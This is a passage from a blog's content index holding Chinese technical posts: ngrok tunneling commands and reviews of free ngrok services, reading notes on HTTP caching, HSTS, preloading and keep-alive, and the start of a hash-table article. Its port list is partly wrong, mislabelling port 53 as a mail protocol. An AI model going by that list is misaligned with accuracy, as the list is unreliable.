class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><ul><li>如果想要在外网访问内网中的Web服务，则可以使用下面的代码：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ngrok.exe -<span class="hljs-built_in">log</span>=ngrok_log.txt -subdomain=<span class="hljs-built_in">test</span> -config=<span class="hljs-string">&quot;ngrok.cfg&quot;</span> 80<br></code></pre></td></tr></table></figure><ul><li>如果想要在外网访问内网中的TCP服务，则可以使用下面的代码(例如访问内网中机器的TCP协议的3389端口)：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ngrok.exe -<span class="hljs-built_in">log</span>=ngrok_log.txt -subdomain=<span class="hljs-built_in">test</span> -config=<span class="hljs-string">&quot;ngrok.cfg&quot;</span> -proto=tcp 3389<br></code></pre></td></tr></table></figure><p>上面代码的解释为：</p><ul><li>日志： -log&#x3D;ngrok_log.txt 是记录ngrok的日志，如果前期调试的时候加上这个参数，如果不能访问就可以查看到底是什么问题</li><li>子域名： -subdomain&#x3D;test 是定义访问的时候的子域名，现在访问 ngrok.testbug.top:6060 就可以访问到这一台机器上80端口的服务</li></ul><p><em><strong>备注  常用的工作在TCP协议上的端口列表如下：</strong></em></p><ul><li>53 ：MTP，邮件传输协议</li><li>80 ：HTTP（超文本传输协议）- 用于传输网页</li><li>110 ：POP3，“邮局协议”，第3版 - 用于接收电子邮件</li><li>115 ：SFTP，简单文件传输协议</li><li>3389 ：远程桌面协议（RDP）</li><li>8008&#x2F;8080 ：HTTP 替代端口</li><li>8080 : Apache Tomcat</li></ul><h2 id="三、一些基于的Ngrok的免费内网穿透服务"><a href="#三、一些基于的Ngrok的免费内网穿透服务" class="headerlink" title="三、一些基于的Ngrok的免费内网穿透服务"></a>三、一些基于的Ngrok的免费内网穿透服务</h2><h3 id="3-1、NATAPP-基于ngrok高速内网穿透"><a href="#3-1、NATAPP-基于ngrok高速内网穿透" class="headerlink" title="3.1、NATAPP 基于ngrok高速内网穿透"></a>3.1、<a href="https://natapp.cn/" target="_blank">NATAPP 基于ngrok高速内网穿透</a></h3><p>第一次使用需要注册，竟然只能用手机号注册，注册后可以在个人页面看到存在免费隧道可用，阿里云国内服务器，不支持绑定自己的域名，不支持Https，1M的带宽(估计也是共享带宽)，一分钟60个连接数的限制，最大TCP连接数五个，分配的三级域名以及端口还不定时强制更换，更恶心的是使用这个免费隧道还需要实名认证，不推荐！极不推荐！</p><h3 id="3-2、Ngrok国内免费服务器"><a href="#3-2、Ngrok国内免费服务器" class="headerlink" title="3.2、Ngrok国内免费服务器"></a>3.2、<a href="http://qydev.com/" target="_blank">Ngrok国内免费服务器</a></h3><p>这是我使用的第一个Ngrok内网穿透服务，这应该是一个学生免费提供的的Ngrok内网穿透服务，当初应该是为了贡献闲置资源，现在我感觉用起来越来越舒服，一不需要注册，二不需要实名，三不需要花钱，简直就是Ngrok内网穿透的福音呀！并且还十分稳定，十分良心，建议大家如果觉的好用，给人家捐赠点维护费用，利人利己。强烈推荐这款服务！</p><h3 id="3-3、Sunny-Ngrok内网转发"><a href="#3-3、Sunny-Ngrok内网转发" class="headerlink" title="3.3、Sunny-Ngrok内网转发"></a>3.3、<a href="https://www.ngrok.cc/" target="_blank">Sunny-Ngrok内网转发</a></h3><p>这也是一个体验性挺好的Ngrok内网穿透服务，第一个看到这网站的界面我就猜到了他应该是基于ThinkCMF写的，虽然如果你要使用这个也需要注册，但是人家的注册就不想某些人那样，人家直接使用邮箱就可以注册，还不用邮箱验证，估计邮箱也就是为了找回密码用的，后台界面很简洁，提供两种隧道供选择，一种是香港100M服务器，10元&#x2F;月，一种是香港10M免费的，它的免费隧道可以固定自己的三级域名，也可以把自己的域名CNAME解析到server.ngrok.cc从而使用自定义域名，还有一个有意思的是，它可以设置在http映射的时候是否需要访问认证，这有加了一层安全保障，关键是这些都是免费的，更好的是，似乎我们可以建很多的免费的隧道，这就很好了，也是值得推荐的！</p><h3 id="3-4、魔法隧道"><a href="#3-4、魔法隧道" class="headerlink" title="3.4、魔法隧道"></a>3.4、<a href="http://mofasuidao.cn/" target="_blank">魔法隧道</a></h3><p>据说(知乎上一个人说的)是所谓的最稳定的Ngrok，注册也是需要手机号码的，好吧，我不计较是不是需要用手机号了，登进去管理界面才发现，好嘛<del>签到送流量，我点击了签到，好嘛</del>送了我 0.90M ，果断关了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Ngrok </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读《Web性能优化与HTTP/2》有感笔记</title>
      <link href="/2017/04/26/web-performance-http2/"/>
      <url>/2017/04/26/web-performance-http2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>前段时间本着尝鲜与想释放看书的欲望的初衷入手了Kindle PaperWhite 3，买来后便把之前一直想看但迫于书籍的沉重与携带的不便而没看的书籍塞了进去，其中有一本叫做《Web性能优化与HTTP&#x2F;2》，这是从看云上找到的一本书籍，被题目所吸引，但是放入后才发现这本书中并没有多少字，但是牵扯出的东西却太多了，所以打算写这么一篇，记录一下自己的感受与学习。</p><blockquote><p>下面以书中所提及的知识点为主线，记录我对于各个知识点的学习与感受</p></blockquote><h2 id="二、Http-304"><a href="#二、Http-304" class="headerlink" title="二、Http 304"></a>二、Http 304</h2><p>304 Not Modified是一个在网页浏览过程中不会直接发现的一个提示，在正常浏览网页的时候用户不可见，只有当我们打开Console控制台的时候才会发现，请求列表中存在304响应状态码。</p><p>如果客户端发送了一个带条件的GET请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</p><h3 id="2-1、Http-304的响应状态的资源更新机制："><a href="#2-1、Http-304的响应状态的资源更新机制：" class="headerlink" title="2.1、Http 304的响应状态的资源更新机制："></a>2.1、Http 304的响应状态的资源更新机制：</h3><ul><li>可能请求一：当客户端缓存了目标资源但不确定该缓存资源是否是最新版本的时候, 就会发送一个条件请求，这样就可以辨别出一个请求是否是条件请求，在进行条件请求时,304请求的响应头信息里面有两个比较重要的请求头字段：If-Modified-Since【其值为服务器上次返回的Last-Modified响应头中的Date日期值】和 If-None-Match【其值为服务器上次返回的ETag响应头的值】，这两个字段表示发送的是一个条件请求。 </li><li>结果一：服务器会读取到这两个请求头中的值,判断出客户端缓存的资源是否是最新的,如果是的话,服务器就会返回HTTP&#x2F;304 Not Modified响应头, 但没有响应体。客户端收到304响应后,就会从本地缓存中读取对应的资源. </li><li>结果二：服务器认为客户端缓存的资源已经过期了,那么服务器就会返回HTTP&#x2F;200 OK响应,响应体就是该资源当前最新的内容。客户端收到200响应后,就会用新的响应体覆盖掉旧的缓存资源。</li><li>可能请求二：如果客户端第一次请求该资源或者请求该资源的响应头不存在了Last-Modified和ETag请求头字段,则必须无条件(unconditionally)请求该资源,服务器也就必须返回完整的资源数据。</li></ul><h3 id="2-2、使用条件请求机制的原因："><a href="#2-2、使用条件请求机制的原因：" class="headerlink" title="2.2、使用条件请求机制的原因："></a>2.2、使用条件请求机制的原因：</h3><ul><li>因为可以省去传输整个响应体的时间，所以条件请求可以加速网页的打开时间，但仍然会有网络延迟，因为浏览器还是得为每个资源生成一条条件请求，并且等到服务器返回HTTP&#x2F;304响应，才能读取缓存来显示网页。</li></ul><h3 id="2-3、其他可用策略："><a href="#2-3、其他可用策略：" class="headerlink" title="2.3、其他可用策略："></a>2.3、其他可用策略：</h3><ul><li>如果服务器在响应上指定Cache-Control或Expires指令，这样客户端就能知道该资源的可用时间为多长，也就能跳过条件请求的步骤，直接使用缓存中的资源了。</li></ul><h2 id="三、gzip压缩Http-body"><a href="#三、gzip压缩Http-body" class="headerlink" title="三、gzip压缩Http body"></a>三、gzip压缩Http body</h2><p>gzip 是 GNUzip 的缩写，最早用于 UNIX 系统的文件压缩。HTTP 协议上的 gzip 编码是一种用来改进 web 应用程序性能的技术，web 服务器和客户端（浏览器）必须共同支持 gzip。目前主流的浏览器，Chrome,firefox,IE 等都支持该协议。常见的服务器如 Apache，Nginx，IIS 同样支持 gzip。gzip压缩比率在3到10倍左右，可以大大节省服务器的网络带宽。而在实际应用中，并不是对所有文件进行压缩，通常只是压缩静态文件。</p><h3 id="3-1、Web服务器处理HTTP压缩的过程图解："><a href="#3-1、Web服务器处理HTTP压缩的过程图解：" class="headerlink" title="3.1、Web服务器处理HTTP压缩的过程图解："></a>3.1、Web服务器处理HTTP压缩的过程图解：</h3><p><img src="/assets/images/web-perf-http2-1.jpg" alt="Web服务器处理HTTP压缩的过程" loading="lazy"></p><h2 id="四、HSTS策略"><a href="#四、HSTS策略" class="headerlink" title="四、HSTS策略"></a>四、HSTS策略</h2><p>HTTP严格传输安全（英语：HTTP Strict Transport Security，缩写：HSTS）是一套由互联网工程任务组发布的互联网安全策略机制。网站可以选择使用HSTS策略，来让浏览器强制使用HTTPS与网站进行通信，以减少会话劫持风险。</p><h3 id="4-1、HSTS策略的作用以使用说明"><a href="#4-1、HSTS策略的作用以使用说明" class="headerlink" title="4.1、HSTS策略的作用以使用说明"></a>4.1、HSTS策略的作用以使用说明</h3><p>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含Strict-Transport-Security字段。非加密传输时设置的HSTS字段无效。</p><p>比如，<a href="https://www.bugwz.com/">https://www.bugwz.com</a> 的响应头含有Strict-Transport-Security: max-age&#x3D;31536000; includeSubDomains。这意味着两点：</p><ul><li>在接下来的一年（即31536000秒）中，浏览器只要向example.com或其子域名发送HTTP请求时，必须采用HTTPS来发起连接。比如，用户点击超链接或在地址栏输入 <a href="https://www.bugwz.com/">https://www.bugwz.com</a> ，浏览器应当自动将 http 转写成 https，然后直接向 <a href="https://www.bugwz.com/">https://www.bugwz.com</a> 发送请求。</li><li>在接下来的一年中，如果 <a href="https://www.bugwz.com/">https://www.bugwz.com</a> 服务器发送的TLS证书无效，用户不能忽略浏览器警告继续访问网站。</li></ul><h3 id="4-2、HSTS策略的一些问题"><a href="#4-2、HSTS策略的一些问题" class="headerlink" title="4.2、HSTS策略的一些问题"></a>4.2、HSTS策略的一些问题</h3><p>HSTS策略在它看到STS头部声明的max-age的期间内保护了客户端从Http到https跳转的过程中的可能的被拦截。然而，HSTS并不是http回话劫持的完美解决方案。用户在访问HSTS保护的网站时，在以下情况下仍然容易受到攻击：</p><ul><li>以前从未访问过该网站</li><li>最近重新安装了其操作系统</li><li>最近重新安装了其浏览器</li><li>切换到新的浏览器</li><li>切换到一个新的设备如移动电话</li><li>删除浏览器的缓存</li><li>最近没访问过该站并且max-age过期了</li></ul><p>为了解决这个问题，Google坚持维护了一个”HSTS preload list”的站点域名和子域名，并通过<a href="https://hstspreload.appspot.com/" target="_blank">https://hstspreload.appspot.com/</a>【需要额外的手段才可以顺畅访问】提交其域名。该域名列表被分发和硬编码到主流的web浏览器。客户端访问此列表中的域名将主动的使用HTTPS，并拒绝使用HTTP访问该站点。<br>一旦设置了STS头部或者提交了你的域名到HSTS预加载列表，这是不可能将其删除的。这是一个单向不可逆的决定了你的域名必须通过Https进行访问的方法。</p><h2 id="五、资源预加载"><a href="#五、资源预加载" class="headerlink" title="五、资源预加载"></a>五、资源预加载</h2><p>当我们访问一个页面的时候，该页面可能有一些资源存在很大的几率被用户点击查看，那么我们就可能需要对这些资源进行预加载，例如《Web性能优化与HTTP&#x2F;2》这本书中所说的DNS预解析,这就可以减少一些DNS解析时间，提升用户访问的体验。资源预加载这种做法曾经被称为<code>prebrowsing</code>，但这并不是一项单一的技术，可以细分为几个不同的技术：<code>DNS-prefetch</code>、<code>subresource</code> 和标准的 <code>prefetch</code>、<code>preconnect</code>、<code>prerender</code>。</p><h3 id="5-1、DNS-预解析-DNS-Prefetch"><a href="#5-1、DNS-预解析-DNS-Prefetch" class="headerlink" title="5.1、DNS 预解析 DNS-Prefetch"></a>5.1、DNS 预解析 DNS-Prefetch</h3><p>当你浏览一个网页的时候，浏览器会在加载网页时对网页中包含的域名进行解析缓存，这样在你单击当前已经加载完成的网页中的链接时就无需再进行DNS 回源解析，减少用户的等待时间，提高用户体验。</p><p>操作方法跟简单，只需要在文档顶部的 <head> 标签中加入以下代码(例如：其中的host可以为bugwz.com)：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//host/&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>这似乎是一个非常微小的性能优化，显得也并非那么重要，但事实并非如此 – <a href="https://docs.google.com/presentation/d/18zlAdKAxnc51y_kj-6sWLmnjl6TLnaru_WH0LJTjP-o/present?slide=id.g120f70e9a_041">Chrome 一直都做了类似的优化</a>。实际上，单纯执行 DNS-Prefetch 只能够微小的提升浏览性能，因为大部分现代浏览器也都内置了预解析的功能，甚至在你在地址栏输入域名时就完成了预解析。通过阅读Chormium 的文档，得到以下信息：</p><ul><li>不用对超链接做手动 dns prefetching，因为 chrome 会自动做 dns prefetching</li><li>chrome 会自动把当前页面的所有带 href 的 link 的 dns 都 prefetch 一遍</li><li>对于一些需要跳转的域名做好预解析，最多可以减少 300~500ms 的加载时间</li></ul><p>兼容性展示：<br><img src="/assets/images/web-perf-http2-2.jpg" alt="DNS-Prefetch" loading="lazy"></p><h3 id="5-2、预连接-Preconnect"><a href="#5-2、预连接-Preconnect" class="headerlink" title="5.2、预连接 Preconnect"></a>5.2、预连接 Preconnect</h3><p>与 DNS 预解析类似，<code>preconnect</code> 不仅完成 DNS 预解析，同时还将进行 TCP 握手和建立传输层协议。预先建立 socket 连接，从而消除昂贵的 DNS 查找、TCP 握手和 TLS 往返开销。使用方法是在文档顶部的 <head> 标签中加入以下代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preconnect&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://bugwz.com&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>兼容性展示：<br><img src="/assets/images/web-perf-http2-3.jpg" alt="预连接 Preconnect" loading="lazy"></p><h3 id="5-3、预获取-Prefetching"><a href="#5-3、预获取-Prefetching" class="headerlink" title="5.3、预获取 Prefetching"></a>5.3、预获取 Prefetching</h3><p>如果我们确定某个资源将来一定会被使用到，我们可以让浏览器预先请求该资源并放入浏览器缓存中。例如，一个图片和脚本或任何可以被浏览器缓存的资源，使用方法是在文档顶部的 <head> 标签中加入以下代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;image.png&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>Prefetching 有两种用法。其中 prefetch 为将来的页面提供了一种低优先级的资源预加载方式，而 subresource 为当前页面提供了一种高优先级的资源预加载。所以，如果资源是当前页面必须的，或者资源需要尽快可用，那么最好使用 subresource。用法如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;subresource&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>注意：与 DNS 预解析不同，预获取真正请求并下载了资源，并储存在缓存中。但预获取还依赖于一些条件，某些预获取可能会被浏览器忽略，例如从一个非常缓慢的网络中获取一个庞大的字体文件。并且，Firefox 只会在浏览器闲置时进行资源预获取。目前，字体文件必须等到 DOM 和 CSS 构建完成之后才开始下载，使用预获取就可以轻松绕过该瓶颈。</p><p>兼容性展示：<br><img src="/assets/images/web-perf-http2-3.jpg" alt="预连接 Preconnect" loading="lazy"><br><img src="/assets/images/web-perf-http2-4.jpg" alt="预获取 subresource" loading="lazy"></p><h3 id="5-4、预渲染-Prerender"><a href="#5-4、预渲染-Prerender" class="headerlink" title="5.4、预渲染 Prerender"></a>5.4、预渲染 Prerender</h3><p>这是一个核武器，因为 prerender 可以预先加载文档的所有资源，代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;prerender&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://bugwz.com/&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>这类似于在一个隐藏的 tab 页中打开了某个链接 – 将下载所有资源、创建 DOM 结构、完成页面布局、应用 CSS 样式和执行 JavaScript 脚本等。当用户真正访问该链接时，隐藏的页面就切换为可见，使页面看起来就是瞬间加载完成一样。Google 搜索在其即时搜索页面中已经应用该技术多年了，微软也宣称在 IE11 中支持该特性。</p><p>需要注意的问题：</p><ul><li>不要滥用该特性，当你知道用户一定会点击某个链接时才可以进行预渲染，因为预加载的开销（抢占 CPU 资源，消耗电池，浪费带宽等）是高昂的，所以必须谨慎行事</li><li>使用 <a href="https://www.w3.org/TR/page-visibility/">Page Visibility API</a> 可以防止页面真正可见前被执行</li></ul><p>兼容性展示：<br><img src="/assets/images/web-perf-http2-5.jpg" alt="预渲染 Prerender" loading="lazy"></p><h3 id="5-5、Preload"><a href="#5-5、Preload" class="headerlink" title="5.5、Preload"></a>5.5、Preload</h3><p>preload 是一个新规范，与 prefetch 不同（可能被忽略）的是，浏览器一定会预加载该资源,使用代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;image.png&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>兼容性展示：<br><img src="/assets/images/web-perf-http2-6.jpg" alt="Preload" loading="lazy"></p><h2 id="六、手动管理缓存localStorage"><a href="#六、手动管理缓存localStorage" class="headerlink" title="六、手动管理缓存localStorage"></a>六、手动管理缓存localStorage</h2><p>localStorage是HTML5中的特性，来实现手动控制缓存。大概的思路是，在定义模块时，同时将模块的代码和版本号分别储存到localStorage，在下一次打算请求模块之前，我们先判断模块的最新版本是不是在localStorage中，将不存在的模块组合在一起，请求动态合并的资源。</p><h3 id="6-1、Cookie-LocalStorage-与-SessionStorage"><a href="#6-1、Cookie-LocalStorage-与-SessionStorage" class="headerlink" title="6.1、Cookie, LocalStorage 与 SessionStorage"></a>6.1、Cookie, LocalStorage 与 SessionStorage</h3><ul><li>Cookie：Cookie的大小限制为4KB左右，是网景公司的前雇员 Lou Montulli 在1993年3月的发明。它的主要用途有保存登录信息，比如你登录某个网站市场可以看到“记住密码”，这通常就是通过在 Cookie 中存入一段辨别用户身份的数据来实现的。</li><li>LocalStorage：LocalStorage 是 HTML5 标准中新加入的技术，它并不是什么划时代的新东西,早在 IE 6 时代，就有一个叫 userData 的东西用于本地存储，而当时考虑到浏览器兼容性，更通用的方案是使用 Flash。而如今，localStorage 被大多数浏览器所支持。创建的代码实例如下：</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-property">lastname</span>=<span class="hljs-string">&quot;Smith&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-property">lastname</span>);<br></code></pre></td></tr></table></figure><ul><li>sessionStorage：sessionStorage 与 localStorage 的接口类似，但保存数据的生命周期与 localStorage 不同。做过后端开发的同学应该知道 Session 这个词的意思，直译过来是“会话”。而 sessionStorage 是一个前端的概念，它只是可以将一部分数据在当前会话中保存下来，刷新页面数据依旧存在。但当页面关闭后，sessionStorage 中的数据就会被清空。创建的代码实例如下：</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-property">lastname</span>=<span class="hljs-string">&quot;Smith&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-property">lastname</span>);<br></code></pre></td></tr></table></figure><ul><li>三者对比详情如下所示：<br><img src="/assets/images/web-perf-http2-7.jpg" alt="sessionStorage：sessionStorage 与 localStorage对比" loading="lazy"></li></ul><h3 id="6-2、需要注意的一些地方"><a href="#6-2、需要注意的一些地方" class="headerlink" title="6.2、需要注意的一些地方"></a>6.2、需要注意的一些地方</h3><ul><li>严禁将一些敏感数据放置在Cookie、localStorage 和 sessionStorage 中，因为只要打开Console控制台我就可以查看并修改这些存储在本地的值。</li><li>假如同域下的其他页面被XSS攻击，攻击者就可以篡改localStorage的内容，可能导致原来的页面代码被植入恶意程序。</li><li>在执行每个网页模块之前，需要计算一下代码摘要，对比下服务器给的该模块的摘要，再决定是否使用，也可以使用SRI策略(关于SRI策略的详解信息，可移步<a href="https://imququ.com/post/subresource-integrity.html" target="_blank">这里</a>)，由浏览器帮你做校验。</li></ul><h2 id="七、HTTP持久连接-keep-alive和persistent"><a href="#七、HTTP持久连接-keep-alive和persistent" class="headerlink" title="七、HTTP持久连接 keep alive和persistent"></a>七、HTTP持久连接 keep alive和persistent</h2><p>HTTP持久连接可以避免每次都经历缓慢的连接建立阶段，减少三次握手的RTT延迟，以及每次都执行关闭操作，节省耗时和带宽；避免TCP连接慢启动特性的拥塞适应阶段，从而利用重用TCP连接这一措施加速数据传输。一个客户端对任何服务器或代理最多只能维护两条持久连接，以防服务器过载。HTTP持久连接的两种类型为：</p><ul><li>HTTP&#x2F;1.0+ “keep-alive”连接</li><li>HTTP&#x2F;1.1 “persistent”连接</li></ul><h3 id="7-1、HTTP-1-0-keep-alive连接"><a href="#7-1、HTTP-1-0-keep-alive连接" class="headerlink" title="7.1、HTTP&#x2F;1.0+ keep-alive连接"></a>7.1、HTTP&#x2F;1.0+ keep-alive连接</h3><p>HTTP&#x2F;1.0+中支持的是keep-alive连接，keep-alive握手过程如下所示：</p><ul><li><p>HTTP&#x2F;1.0+支持keep-alive连接，但默认并未激活。客户端通过发送一个包含Connection: Keep-Alive首部的请求来请求服务器激活keep-alive连接，即将这条连接保持在打开状态。</p></li><li><p>如果服务器愿意为下一条请求重用此连接，就会在响应中包含相同的首部。若没有，服务器就会在发回响应报文后关闭连接。客户端就是通过检测响应中是否包含Connection: Keep-Alive响应首部来判断服务器是否会在发送响应后关闭连接</p></li><li><p>假如服务器同意使用keep-alive连接，那么接下来客户端必须在所有希望保持持久连接的请求中包含Connection: Keep-Alive首部。如果没有发送该首部，服务器会在那条请求后关闭连接。</p></li><li><p>注意，Connection: Keep-Alive首部只是请求将连接保持在活跃状态。即使服务器和客户端都同意建立持久连接了，它们仍可以在任意时刻关闭空闲的keep-alive连接，且可随意限制keep-alive连接所处理事务的数量。我们可以通过Keep-Alive选项调节它们的行为，具体请看下一部分。</p></li></ul><p>Keep-Alive选项解释说明：</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><span class="hljs-attribute">Keep-Alive</span><span class="hljs-punctuation">: </span>max=5, timeout=120<br></code></pre></td></tr></table></figure><ul><li>参数timeout：在Keep-Alive响应首部中发送，告诉客户端服务器估计会在打开状态保持到连接空闲多长时间后关闭连接。</li><li>参数max：在Keep-Alive响应首部中发送，告诉客户端服务器还会为另外几个http事务将连接保持在打开状态。</li><li>注意，这两个参数值仅仅是估计，并非承诺。</li></ul><h3 id="7-2、HTTP-1-1的persistent连接"><a href="#7-2、HTTP-1-1的persistent连接" class="headerlink" title="7.2、HTTP&#x2F;1.1的persistent连接"></a>7.2、HTTP&#x2F;1.1的persistent连接</h3><ul><li><p>HTTP&#x2F;1.1逐渐停止了对keep-alive连接的支持，用persistent连接替代了它，与keep-alive连接不同，HTTP&#x2F;1.1中persistent连接默认就是激活的，除非特别指明，否则HTTP&#x2F;1.1认为所有连接都是持久的。</p></li><li><p>HTTP&#x2F;1.1的客户端假定在收到的响应后，除非报文包含了Connection: Close首部，否则客户端就认为连接仍为维持在打开状态。如果客户端要建立一个非持久连接，则需要在请求中包含Connection: Close首部；服务器在处理完该事务后，就会在响应中包含Connection: Close首部以告知客户端连接已关闭。如果客户端不想在一条persistent连接上发送更多请求了，就应该在最后一条请求中包含Connection: Close首部。</p></li><li><p>只要服务器决定在事务处理结束后关闭连接，就必须在响应中包含Connection: Close首部。但不发送Connection: Close首部也并不意味着服务器承诺永远将连接保持在打开状态。同样地，不管连接是否维持在打开状态，或Connection首部取了什么值，客户端和服务器仍然可以随时关闭空闲连接。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希数据分布及冲突解决方法</title>
      <link href="/2017/03/01/hash/"/>
      <url>/2017/03/01/hash/</url>
      
        <content type="html"><![CDATA[<p>哈希表是我们常用的一种数据结构，它拥有的 O(1) 的读写时间复杂度，但是由于它是通过计算特征并存储原始数据的方式进行实现的，因为不可避免的我们就需要考虑哈希冲突的问题，本文中列出了目前流行的多种的数据冲突解决方式。</p><h2 id="一、Hash表基本概念"><a href="#一、Hash表基本概念" class="headerlink" title="一、Hash表基本概念"></a>一、Hash表基本概念</h2><h3 id="1-1、装填因子"><a href="#1-1、装填因子" class="headerlink" title="1.1、装填因子"></a>1.1、装填因子</h3><p>装填因子 &#x3D; （哈希表中的记录数） &#x2F;  （哈希表的长度）</p><p>装填因子是哈希表装满程度的标记因子。值越大，填入表中的数据元素越多，产生冲突的可能性越大。</p><h2 id="二、Hash函数"><a href="#二、Hash函数" class="headerlink" title="二、Hash函数"></a>二、Hash函数</h2><h3 id="2-1、直接寻址法"><a href="#2-1、直接寻址法" class="headerlink" title="2.1、直接寻址法"></a>2.1、直接寻址法</h3><p>将某个关键字或者关键字的某个线性函数值作为哈希地址，即<code>Func(Key)=a*Key+b</code>，其中a和b为整数；这种散列函数也叫做自身函数，如果<code>Func(Key)</code>的哈希地址上已经有值了，那么就往下一个位置找，直到找到<code>Func(Key)</code>的位置没有值了就把元素放进去。</p><h3 id="2-2、数字分析法"><a href="#2-2、数字分析法" class="headerlink" title="2.2、数字分析法"></a>2.2、数字分析法</h3><p>分析要写入的数据，依据数据的特性，选择数字出现冲突率较低的部分列来构造哈希地址，因此数字分析法就是找出数字的规律，尽可能利用这些数据来构造冲突几率较低的散列地址。</p><h3 id="2-3、平方取中法"><a href="#2-3、平方取中法" class="headerlink" title="2.3、平方取中法"></a>2.3、平方取中法</h3><p>取一个数平方后的中间几位作为散列地址，一个数的平方值的中间几位和数的每一位都有关。因此，利用平方取中法得到的哈希地址同数字的每一位都有关，这样的哈希地址具有较好的分散性。该方法适用于关键字中的每一位取值都不够分散或者较分散的位数小于哈希地址所需要的位数的情况。</p><h3 id="2-4、折叠法"><a href="#2-4、折叠法" class="headerlink" title="2.4、折叠法"></a>2.4、折叠法</h3><p>折叠法即将关键字分割成位数相同的几部分，最后一部分位数可以不同，然后取这几部分的叠加和（注意：叠加和时去除进位）作为散列地址，数位叠加可以有<code>移位叠加</code>和<code>间界叠加</code>两种方法：</p><ul><li><code>移位叠加</code>：将分割后的每一部分的最低位对齐，然后相加;</li><li><code>间界叠加</code>：从一端向另一端沿分割界来回折叠，然后对齐相加；</li></ul><h3 id="2-5、随机数法"><a href="#2-5、随机数法" class="headerlink" title="2.5、随机数法"></a>2.5、随机数法</h3><p>选择一个随机数，去关键字的随机值作为散列地址，通常用于关键字长度不同的场合。</p><h3 id="2-6、取余数法（比较常用）"><a href="#2-6、取余数法（比较常用）" class="headerlink" title="2.6、取余数法（比较常用）"></a>2.6、取余数法（比较常用）</h3><p>取关键字被某个不大于散列表长度的基数p，除后所得的余数为散列地址，即<code>Func(Key)=Key MOD p</code>，其中<code>p&lt;=m</code>。不仅可以对关键字直接取模，也可在折叠、平方取中等运算之后取模。对<code>p</code>的选择很重要，一般取<code>素数</code>，若<code>p</code>选得不好，则很容易产生冲突，一般<code>p</code>取值为哈希表的长度。</p><h2 id="三、Hash冲突解决方法"><a href="#三、Hash冲突解决方法" class="headerlink" title="三、Hash冲突解决方法"></a>三、Hash冲突解决方法</h2><h3 id="3-1、开放定址法（线性探测法）"><a href="#3-1、开放定址法（线性探测法）" class="headerlink" title="3.1、开放定址法（线性探测法）"></a>3.1、开放定址法（线性探测法）</h3><p>线性探测法的地址增量<code>di = 1, 2, ... , m-1</code>，其中<code>i</code>为探测次数。该方法一次探测一个地址（上次探测的下一个地址），直到有空的地址后插入，若整个空间都找不到空余的地址，则产生溢出。</p><p>线性探测容易产生<code>聚集现象</code>，当表中的第<code>i</code>、<code>i+1</code>、<code>i+2</code>的位置上已经存储某些关键字，则下一次哈希地址为<code>i</code>、<code>i+1</code>、<code>i+2</code>、<code>i+3</code>的关键字都将企图填入到<code>i+3</code>的位置上，这种多个哈希地址不同的关键字争夺同一个后继哈希地址的现象称为<code>聚集</code>。聚集对查找效率有很大影响。</p><h3 id="3-2、链地址法（拉链法）"><a href="#3-2、链地址法（拉链法）" class="headerlink" 